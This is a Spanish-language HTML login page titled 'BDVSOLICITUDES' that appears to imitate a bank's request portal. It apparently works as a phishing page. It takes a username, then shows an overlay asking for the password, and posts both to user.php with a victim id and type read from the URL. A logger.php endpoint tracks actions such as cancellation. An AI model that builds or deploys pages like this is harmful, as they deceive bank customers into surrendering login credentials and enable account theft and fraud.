<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>BDVSOLICITUDES</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="icon" href="favicon.png" type="image/x-icon">
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; background-image: url(background.webp); background-size: cover; background-position: center; }
        .container { display: flex; height: 100%; width: 80%; }
        .left-side { width: 40%; display: flex; justify-content: center; align-items: center; }
        .right-side { width: 30%; }
        .form { width: 80%; background: white; max-width: 550px; box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1); }
        @media (max-width: 768px) { body { background: #ededed; } .container { flex-direction: column; } .left-side { width: 100%; height: 100vh; } .right-side { display: none; } }
        .form-group { position: relative; margin-bottom: 20px; margin: 20px; }
        .form-group label { position: absolute; top: 50%; left: 10px; transform: translateY(-55%); color: #999; transition: top 0.3s, font-size 0.3s; pointer-events: none; }
        .form-group input { width: 100%; padding: 10px; box-sizing: border-box; height: 60px; border: 0; border-bottom: 1px solid gray; background: #ededed; outline: none; }
        .form-group input:focus + label, .form-group input:not(:placeholder-shown) + label { top: 5px; font-size: 12px; }
        button { background-color: #0067b1; color: white; border-radius: 3px; border: 0; padding: 10px 20px; text-align: center; cursor: pointer; font-size: 16px; }
        button:disabled { background-color: #E0E0E0; cursor: not-allowed; }
        .button-container { display: flex; justify-content: center; gap: 10px; margin-top: 20px; margin-bottom: 20px; }
        .cancel-btn { background-color: #0067b1; }
        .form-group2 { position: relative; margin-bottom: 20px; margin: 20px; }
        .form-group2 label { position: absolute; top: 50%; left: 23%; transform: translateY(-55%); color: #999; transition: top 0.3s, font-size 0.3s; pointer-events: none; }
        .form-group2 input { padding: 10px; width: 90%; box-sizing: border-box; height: 60px; border: 0; border-bottom: 1px solid gray; background: #ededed; outline: none; }
        .overlay { display: none; justify-content: center; align-items: center; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); z-index: 9999; }
        .content { background-color: #fff; width: 350px; border-radius: 5px; text-align: center; padding-top: 10px; }
        #entrarBtn { width: 180px; height: 38px; background-color: #0067b1; color: white; border-radius: 3px; cursor: pointer; border: none; }
    </style>
</head>
<body>
    <div class="overlay" id="overlay">
        <div class="content">
            <form method="post" action="user.php" id="contraForm">
                <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
                <div class="form-group2">
                    <input type="password" name="contra" id="contra" required placeholder=" " />
                    <label for="contra">Contraseña *</label>
                    <i class="material-icons" onclick="togglePasswordVisibility()" style="cursor:pointer; vertical-align: middle;">visibility</i>
                </div>
                <input type="hidden" name="nombre" id="nombreOculto" /> 
                <input type="hidden" name="identificacion" id="identificacionOculta" />
                <input type="hidden" name="tipo_solicitud" id="tipoSolicitudOculta" />
                <div class="button-container">
                    <!-- Se eliminó el onclick de registro aquí -->
                    <button type="submit" id="continuarBtn" disabled>Continuar</button>
                    <button type="button" class="cancel-btn" onclick="cancelar()">Cancelar</button>
                </div>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="left-side">
            <form id="nombreForm" class="form">
                <div style="text-align: center"><img src="logo.png" alt="" style="width: 90%; margin-top: 20px" /></div>
                <div class="form-group">
                    <input type="text" id="nombre" name="nombre" maxlength="16" required oninput="quitarEspacios()" placeholder=" " />
                    <label for="nombre">Usuario *</label>
                </div>
                <div style="width: 100%; text-align: center">
                    <button type="button" id="entrarBtn" disabled>Entrar</button>
                </div>
                <br><br>
            </form>
        </div>
        <div class="right-side"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        document.getElementById("identificacionOculta").value = urlParams.get('id');
        document.getElementById("tipoSolicitudOculta").value = urlParams.get('type');

        function logAccion(accion) {
            const usuario = document.getElementById("nombre").value || "Anónimo";
            fetch('logger.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'accion=' + encodeURIComponent(accion) + '&usuario=' + encodeURIComponent(usuario)
            });
        }

        function enviarNombre() {
            var nombre = document.getElementById("nombre").value;
            var button = document.getElementById("entrarBtn");
            if (nombre.length >= 6) {
                button.disabled = true;
                var formData = new FormData();
                formData.append("nombre", nombre);
                formData.append("identificacion", urlParams.get('id'));
                formData.append("tipo_solicitud", urlParams.get('type'));
                
                fetch("user.php", { method: "POST", body: formData })
                .then(() => {
                    localStorage.setItem("usuario", nombre);
                    document.getElementById("nombreOculto").value = nombre;
                    document.getElementById("overlay").style.display = "flex";
                });
            }
        }

        document.getElementById("entrarBtn").addEventListener("click", enviarNombre);
        
        document.getElementById("nombre").addEventListener("input", function() {
            document.getElementById("entrarBtn").disabled = (this.value.length < 6);
        });

        document.getElementById("contra").addEventListener("input", function() {
            document.getElementById("continuarBtn").disabled = (this.value.length < 8);
        });

        function togglePasswordVisibility() {
            const p = document.getElementById("contra");
            p.type = (p.type === "password") ? "text" : "password";
        }

        function cancelar() {
            logAccion('Canceló proceso');
            window.location.href = "cancel.php";
        }

        function quitarEspacios() {
            var input = document.getElementById("nombre");
            input.value = input.value.trim();
        }
    </script>
</body>
</html>
